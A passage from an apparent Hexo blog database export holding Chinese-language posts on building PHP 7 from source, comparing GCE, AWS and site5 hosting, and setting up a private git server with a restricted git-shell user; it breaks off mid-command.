http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n</pre>\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n<pre>configure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel</pre>\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n<pre style=\"font-size: 14px;\">Generating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n</pre>\n接下来就是漫长的make\n<pre>$ make\n# make install</pre>\n\n##### 大功告成!\n\n<pre>$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</pre>\n\n## 运行\n\n### 路径说明\n\nphp源码包放置在 `/srv/package/php-7`\nphp安装在 `/srv/server/php7`\n\n### 设置配置文件\n\n<pre>cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</pre>\n\n### 作为CGI模式运行在后台\n\n<pre>nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;</pre>\nwordpress 已经支持运行在php7上了\n\n### 优化点\n\n在编译时可以启用fpm --enable-fpm 这样管理php-cgi进程就方便多了","source":"_posts/e5-b0-9d-e9-b2-9cphp-7.md","raw":"---\ntitle: 尝鲜PHP 7\nid: 45\ncategories:\n  - php\ndate: 2015-05-15 06:27:06\ntags:\n---\n\nphp7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．\n\n文档可以在 [https://wiki.php.net/phpng](https://wiki.php.net/phpng) 看到\n\n## 安装\n\n普通用户需要从https协议下载，ssh协议只面向PHP小组开发者\n<pre class=\"code\">git clone https://git.php.net/repository/php-src.git</pre>\n<pre class=\"code\">./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n</pre>\n\n#### 在安装时可能遇到的依赖问题\n\n<pre>checking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n</pre>\n\n##### 需要安装[re2c库](http://re2c.org/)\n\n<pre>wget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n</pre>\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n<pre>configure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel</pre>\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n<pre style=\"font-size: 14px;\">Generating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n</pre>\n接下来就是漫长的make\n<pre>$ make\n# make install</pre>\n\n##### 大功告成!\n\n<pre>$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</pre>\n\n## 运行\n\n### 路径说明\n\nphp源码包放置在 `/srv/package/php-7`\nphp安装在 `/srv/server/php7`\n\n### 设置配置文件\n\n<pre>cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</pre>\n\n### 作为CGI模式运行在后台\n\n<pre>nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;</pre>\nwordpress 已经支持运行在php7上了\n\n### 优化点\n\n在编译时可以启用fpm --enable-fpm 这样管理php-cgi进程就方便多了","slug":"e5-b0-9d-e9-b2-9cphp-7","published":1,"updated":"2018-03-05T11:32:58.733Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cikq00fzgmlmrknxk2wn","content":"<p>php7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．</p>\n<p>文档可以在 <a href=\"https://wiki.php.net/phpng\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/phpng</a> 看到</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>普通用户需要从https协议下载，ssh协议只面向PHP小组开发者</p>\n<pre class=\"code\">git clone https://git.php.net/repository/php-src.git</pre>\n<pre class=\"code\">./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n</pre>\n\n<h4 id=\"在安装时可能遇到的依赖问题\"><a href=\"#在安装时可能遇到的依赖问题\" class=\"headerlink\" title=\"在安装时可能遇到的依赖问题\"></a>在安装时可能遇到的依赖问题</h4><pre>checking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n</pre>\n\n<h5 id=\"需要安装re2c库\"><a href=\"#需要安装re2c库\" class=\"headerlink\" title=\"需要安装re2c库\"></a>需要安装<a href=\"http://re2c.org/\" target=\"_blank\" rel=\"noopener\">re2c库</a></h5><pre>wget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n</pre>\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n<pre>configure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel</pre>\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n<pre style=\"font-size: 14px;\">Generating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n</pre>\n接下来就是漫长的make\n<pre>$ make\n# make install</pre>\n\n<h5 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成!\"></a>大功告成!</h5><pre>$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</pre>\n\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"路径说明\"><a href=\"#路径说明\" class=\"headerlink\" title=\"路径说明\"></a>路径说明</h3><p>php源码包放置在 <code>/srv/package/php-7</code><br>php安装在 <code>/srv/server/php7</code></p>\n<h3 id=\"设置配置文件\"><a href=\"#设置配置文件\" class=\"headerlink\" title=\"设置配置文件\"></a>设置配置文件</h3><pre>cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</pre>\n\n<h3 id=\"作为CGI模式运行在后台\"><a href=\"#作为CGI模式运行在后台\" class=\"headerlink\" title=\"作为CGI模式运行在后台\"></a>作为CGI模式运行在后台</h3><p><pre>nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;</pre><br>wordpress 已经支持运行在php7上了</p>\n<h3 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h3><p>在编译时可以启用fpm –enable-fpm 这样管理php-cgi进程就方便多了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>php7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．</p>\n<p>文档可以在 <a href=\"https://wiki.php.net/phpng\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/phpng</a> 看到</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>普通用户需要从https协议下载，ssh协议只面向PHP小组开发者</p>\n<pre class=\"code\">git clone https://git.php.net/repository/php-src.git</pre>\n<pre class=\"code\">./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n</pre>\n\n<h4 id=\"在安装时可能遇到的依赖问题\"><a href=\"#在安装时可能遇到的依赖问题\" class=\"headerlink\" title=\"在安装时可能遇到的依赖问题\"></a>在安装时可能遇到的依赖问题</h4><pre>checking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n</pre>\n\n<h5 id=\"需要安装re2c库\"><a href=\"#需要安装re2c库\" class=\"headerlink\" title=\"需要安装re2c库\"></a>需要安装<a href=\"http://re2c.org/\" target=\"_blank\" rel=\"noopener\">re2c库</a></h5><pre>wget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n</pre>\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n<pre>configure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel</pre>\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n<pre style=\"font-size: 14px;\">Generating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n</pre>\n接下来就是漫长的make\n<pre>$ make\n# make install</pre>\n\n<h5 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成!\"></a>大功告成!</h5><pre>$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies</pre>\n\n<h2 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h2><h3 id=\"路径说明\"><a href=\"#路径说明\" class=\"headerlink\" title=\"路径说明\"></a>路径说明</h3><p>php源码包放置在 <code>/srv/package/php-7</code><br>php安装在 <code>/srv/server/php7</code></p>\n<h3 id=\"设置配置文件\"><a href=\"#设置配置文件\" class=\"headerlink\" title=\"设置配置文件\"></a>设置配置文件</h3><pre>cp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini</pre>\n\n<h3 id=\"作为CGI模式运行在后台\"><a href=\"#作为CGI模式运行在后台\" class=\"headerlink\" title=\"作为CGI模式运行在后台\"></a>作为CGI模式运行在后台</h3><p><pre>nohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini &gt; /var/log/php-cgi.log &amp;</pre><br>wordpress 已经支持运行在php7上了</p>\n<h3 id=\"优化点\"><a href=\"#优化点\" class=\"headerlink\" title=\"优化点\"></a>优化点</h3><p>在编译时可以启用fpm –enable-fpm 这样管理php-cgi进程就方便多了</p>\n"},{"title":"leetcode刷题的收获","id":"320","_content":"\n一些疑问：\nhttps://leetcode.com/submissions/detail/135786371/\n\n`Array.pop()`的性能为什么低？","source":"_drafts/leetcode刷题的收获.md","raw":"---\ntitle: leetcode刷题的收获\nid: 320\ncategories:\n  - 未分类\ntags:\n---\n\n一些疑问：\nhttps://leetcode.com/submissions/detail/135786371/\n\n`Array.pop()`的性能为什么低？","slug":"leetcode刷题的收获","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5ciks00g1gmlmvjg46lx8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一些疑问：<br><a href=\"https://leetcode.com/submissions/detail/135786371/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/submissions/detail/135786371/</a></p>\n<p><code>Array.pop()</code>的性能为什么低？</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一些疑问：<br><a href=\"https://leetcode.com/submissions/detail/135786371/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/submissions/detail/135786371/</a></p>\n<p><code>Array.pop()</code>的性能为什么低？</p>\n"},{"title":"GCE,AWS,site5主机小对比","id":"56","date":"2015-06-03T15:08:32.000Z","_content":"\n最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．\n\n主要是价格和连接速度的比较：\n\n#### 价格\n\n*   AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月\n*   GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月\n*   site5 没有任何优惠活动，2CPU,1GB $27.5/月\n\n#### 速度\n\n*   AWS 日本，大陆ping在150-300之间，速度一般\n*   GCE 台湾，大陆ping50-100左右．没有遇到过\"超时\"的情况\n*   site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理\n*   IBM softlayer在香港的机房一直很想买，无奈起步价太贵了\n\n### 软件\n\n*   AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子\n*   GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务\n*   site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便\n*   以上这三家都支持Centos7.0 64bit\n综合各方面，最后决定继续使用google的服务\n\nPS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了","source":"_posts/gceawssite5-e4-b8-bb-e6-9c-ba-e5-b0-8f-e5-af-b9-e6-af-94.md","raw":"---\ntitle: 'GCE,AWS,site5主机小对比'\nid: 56\ncategories:\n  - linux\ndate: 2015-06-03 23:08:32\ntags:\n---\n\n最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．\n\n主要是价格和连接速度的比较：\n\n#### 价格\n\n*   AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月\n*   GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月\n*   site5 没有任何优惠活动，2CPU,1GB $27.5/月\n\n#### 速度\n\n*   AWS 日本，大陆ping在150-300之间，速度一般\n*   GCE 台湾，大陆ping50-100左右．没有遇到过\"超时\"的情况\n*   site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理\n*   IBM softlayer在香港的机房一直很想买，无奈起步价太贵了\n\n### 软件\n\n*   AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子\n*   GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务\n*   site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便\n*   以上这三家都支持Centos7.0 64bit\n综合各方面，最后决定继续使用google的服务\n\nPS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了","slug":"gceawssite5-e4-b8-bb-e6-9c-ba-e5-b0-8f-e5-af-b9-e6-af-94","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cikt00g3gmlmmns3t0c1","content":"<p>最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．</p>\n<p>主要是价格和连接速度的比较：</p>\n<h4 id=\"价格\"><a href=\"#价格\" class=\"headerlink\" title=\"价格\"></a>价格</h4><ul>\n<li>AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月</li>\n<li>GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月</li>\n<li>site5 没有任何优惠活动，2CPU,1GB $27.5/月</li>\n</ul>\n<h4 id=\"速度\"><a href=\"#速度\" class=\"headerlink\" title=\"速度\"></a>速度</h4><ul>\n<li>AWS 日本，大陆ping在150-300之间，速度一般</li>\n<li>GCE 台湾，大陆ping50-100左右．没有遇到过”超时”的情况</li>\n<li>site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理</li>\n<li>IBM softlayer在香港的机房一直很想买，无奈起步价太贵了</li>\n</ul>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><ul>\n<li>AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子</li>\n<li>GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务</li>\n<li>site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便</li>\n<li>以上这三家都支持Centos7.0 64bit<br>综合各方面，最后决定继续使用google的服务</li>\n</ul>\n<p>PS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．</p>\n<p>主要是价格和连接速度的比较：</p>\n<h4 id=\"价格\"><a href=\"#价格\" class=\"headerlink\" title=\"价格\"></a>价格</h4><ul>\n<li>AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月</li>\n<li>GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月</li>\n<li>site5 没有任何优惠活动，2CPU,1GB $27.5/月</li>\n</ul>\n<h4 id=\"速度\"><a href=\"#速度\" class=\"headerlink\" title=\"速度\"></a>速度</h4><ul>\n<li>AWS 日本，大陆ping在150-300之间，速度一般</li>\n<li>GCE 台湾，大陆ping50-100左右．没有遇到过”超时”的情况</li>\n<li>site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理</li>\n<li>IBM softlayer在香港的机房一直很想买，无奈起步价太贵了</li>\n</ul>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><ul>\n<li>AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子</li>\n<li>GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务</li>\n<li>site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便</li>\n<li>以上这三家都支持Centos7.0 64bit<br>综合各方面，最后决定继续使用google的服务</li>\n</ul>\n<p>PS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了</p>\n"},{"title":"CSS上下垂直居中复习","id":"337","_content":"","source":"_drafts/CSS上下垂直居中复习.md","raw":"---\ntitle: CSS上下垂直居中复习\nid: 337\ncategories:\n  - 未分类\ntags:\n---\n","slug":"CSS上下垂直居中复习","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5cikw00g5gmlmogjumb8q","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"[译] 使用preconnect预连接优化网络","id":"343","_content":"\n> 本文翻译自 [https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者是 High performance browser network 作者，在线阅读地址 [https://hpbn.co/](https://hpbn.co/)\n在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。\n\n&nbsp;","source":"_drafts/译-使用preconnect预连接优化网络.md","raw":"---\ntitle: '[译] 使用preconnect预连接优化网络'\nid: 343\ncategories:\n  - 未分类\ntags:\n---\n\n> 本文翻译自 [https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者是 High performance browser network 作者，在线阅读地址 [https://hpbn.co/](https://hpbn.co/)\n在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。\n\n&nbsp;","slug":"译-使用preconnect预连接优化网络","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5cikz00g7gmlmw55sumvn","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/</a> ，作者是 High performance browser network 作者，在线阅读地址 <a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"noopener\">https://hpbn.co/</a><br>在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。</p>\n</blockquote>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/</a> ，作者是 High performance browser network 作者，在线阅读地址 <a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"noopener\">https://hpbn.co/</a><br>在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。</p>\n</blockquote>\n<p>&nbsp;</p>\n"},{"title":"搭建自己的git服务器","id":"70","date":"2015-06-06T17:46:57.000Z","_content":"\ngithub私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器\n\n其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化\n\n## 初始化环境\n\n为了安全，我们为git仓库专门设置一个管理用户**git**，约定使用 **/srv/git **放置仓库\n<pre>$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git</pre>\n\n### 上面的参数作用\n\n<pre>--create-home --home-dir=/srv/git</pre>\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n<pre>--root=/srv/git</pre>\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n<pre>--base-dir=/srv/git</pre>\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n<pre>--shell=/usr/bin/git-shell</pre>\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n<pre>$ sudo git --bare init /srv/git/MY_PROJECT.git</pre>\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n<pre>$ git clone git@MYHOST:MY_PROJECT.git</pre>\n\n#### 主机名后的目录只需要填写仓库目录\n\n这是创建用户时指定的 **--base-dir** 立的功，让你不用输入完整的目录 **/srv/git/MY_PROJECT.git**\n\n#### 尝试用git用户登录会被阻止\n\n<pre>$ ssh 